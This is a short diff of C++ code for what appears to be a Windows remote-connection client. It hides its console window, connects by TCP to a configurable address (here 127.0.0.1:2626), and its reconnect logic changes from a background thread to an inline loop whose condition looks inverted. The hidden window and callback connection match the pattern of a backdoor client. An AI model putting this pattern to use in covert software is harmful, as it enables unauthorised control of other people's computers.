@@ -17,19 +17,14 @@ using namespace std::chrono_literals;
 /* TCPSocket tcp = TCPSocket("ip", port); */
 TCPSocket tcp = TCPSocket("127.0.0.1", 2626);
 
-void reconnect()
-{
-	while (tcp.Connect() != E_CONNECT) {
-		std::this_thread::sleep_for(seconds(1));
-	}
-}
-
 int main()
 {
 	/* Hide Console */
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-	std::thread(reconnect).detach();
+	while (tcp.Connect() == E_CONNECT) {
+		std::this_thread::sleep_for(seconds(1));
+	}
 
 	while (true)
 	{
